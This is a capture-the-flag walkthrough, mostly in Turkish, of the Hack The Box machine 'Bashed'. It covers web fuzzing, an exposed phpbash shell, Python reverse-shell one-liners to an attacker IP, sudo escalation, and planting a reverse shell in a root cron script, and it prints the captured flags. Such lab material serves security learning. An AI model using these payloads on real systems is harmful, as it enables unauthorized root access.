<img width="1400" height="1138" alt="1_-YPHvrd3pj3L2cUcZWfsKQ" src="https://github.com/user-attachments/assets/acd542e5-df2c-47b6-9eaf-3805447204fd" />

### About

Bashed is an easy Linux machine focused on web fuzzing and locating exposed development files. After discovering a functional phpbash instance, access is gained as `www-data` and escalated to `scriptmanager` through sudo permissions. As direct crontab access is restricted, root escalation relies on identifying writable scripts executed by a root-owned scheduled task.

### 1. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.51.18
```

<img width="539" height="382" alt="nmap" src="https://github.com/user-attachments/assets/40befac0-da60-43d5-936e-ec02aacdfc55" />

Tek açık port 80, arkasında Apache 2.4.18 üzerinde çalışan bir web uygulaması buluyoruz. Sayfa başlığı `Arrexel's Development Site` — saldırı yüzeyimiz tamamen web katmanına iniyor.

### 2. Web Enumeration

<img width="1010" height="555" alt="site1" src="https://github.com/user-attachments/assets/e3fa8a00-7c42-422c-9e70-bd489d7aa505" />

Sayfa içeriği statik ve boş, direkt dizin taramasına geçiyoruz:

```bash
ffuf -u http://10.129.51.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<img width="753" height="263" alt="ffuf" src="https://github.com/user-attachments/assets/fbd2d3d6-e38f-4829-a488-85c56165816a" />

`dev` dizinini kontrol ediyoruz:

<img width="582" height="318" alt="dev" src="https://github.com/user-attachments/assets/d0c2de47-420f-4d38-97e8-8ba569f0c918" />

Karşımıza **phpbash** çıkıyor — açık kaynaklı, semi-interactive bir PHP web shell.

### 3. Foothold

`phpbash.php`'i açtığımızda tarayıcı üzerinden doğrudan komut çalıştırabiliyoruz — paketlenmiş bir RCE elimizde. İlk iş olarak user flag'i alıyoruz:

```
www-data@bashed:/home/arrexel# cat user.txt
efd6cb94fd86d921ba0cb64f733e6a46
```

<img width="665" height="152" alt="userflag" src="https://github.com/user-attachments/assets/d590441a-5397-4b97-84c9-f31589e7e9be" />

phpbash state tutmuyor, her istekte sayfayı yeniden yüklüyor — web üzerinden ilerlemek pratik değil. Bu yüzden çalışmayı terminale taşıyoruz, klasik bir Python reverse shell atıyoruz:

```bash
rlwrap nc -nvlp 4444
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Bind shell yerine reverse shell'i tercih ediyoruz çünkü outbound bağlantılar inbound'a göre çok daha az kısıtlanıyor.

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
/bin/sh: 0: can't access tty; job control turned off
$
```

Terminale geçtik.

---

### 4. Privilege Escalation — www-data → scriptmanager

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
$ sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

<img width="744" height="542" alt="sudol" src="https://github.com/user-attachments/assets/43414f60-73f4-4b31-b0aa-1fcffd425842" />


`www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyoruz. Klasik bir sudo misconfiguration ile karşı karşıyayız.

```bash
sudo -u scriptmanager /bin/bash
```

### 5. Privilege Escalation — scriptmanager → root

`scriptmanager` context'inde etrafı incelerken dikkatimizi çeken bir dizin buluyoruz:

```
$ ls -ld /scripts
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 /scripts
```

`www-data` iken bu dizine erişimimiz `Permission denied` ile reddediliyordu; izinler sadece `scriptmanager` sahipliği/grubuna yazma-okuma hakkı tanıyor. `sudo -l` çıktısındaki `NOPASSWD: ALL` bize doğrudan crontab erişimi vermiyor — root'un crontab'ını göremiyoruz. Ama isim seçimi (`scriptmanager` + `/scripts`) tek başına güçlü bir sinyal veriyor: bu paternde neredeyse her zaman root'a ait bir cron job, bu dizini periyodik tarayıp içindeki dosyaları kendi yetkisiyle çalıştırır. Crontab'a doğrudan erişimimiz yoksa bunu genelde `pspy` ile doğrularız; Bashed'de senaryo tam olarak bu — `/scripts` altındaki `.py` dosyaları root cron job'u tarafından düzenli aralıklarla execute ediliyor.

Zinciri şöyle kuruyoruz:

1. `/scripts`, `scriptmanager` tarafından yazılabilir.
2. Root, bu dizindeki script'leri periyodik olarak kendi yetkisiyle çalıştırıyor.
3. `scriptmanager` context'imiz bu dizine dosya yazmamıza yetiyor.
4. **Sonuç:** Buraya bıraktığımız herhangi bir kod, root tarafından root yetkisiyle execute ediliyor — klasik *writable path + privileged scheduled execution* kombinasyonu.

İkinci bir listener açıyoruz:

```bash
rlwrap nc -nvlp 4445
```

`/scripts` dizinine yeni payload'ımızı yazıyoruz:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /scripts/test.py
```

<img width="890" height="182" alt="sudol2" src="https://github.com/user-attachments/assets/8d2fa31e-a501-4873-9697-47608b1e38a6" />

Cron'un bir sonraki tetiklenmesini bekliyoruz:

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

`test.py`'yi root'un cron job'u root yetkisiyle çalıştırıyor ve içindeki reverse shell payload'ımız tetikleniyor.

```
# cd /root
# cat root.txt
7296b59278b52eb59fbb3c51f8043a27
```
<img width="503" height="302" alt="rootflag" src="https://github.com/user-attachments/assets/70358fd9-00a0-405b-8b72-8f0c44f2e6c4" />
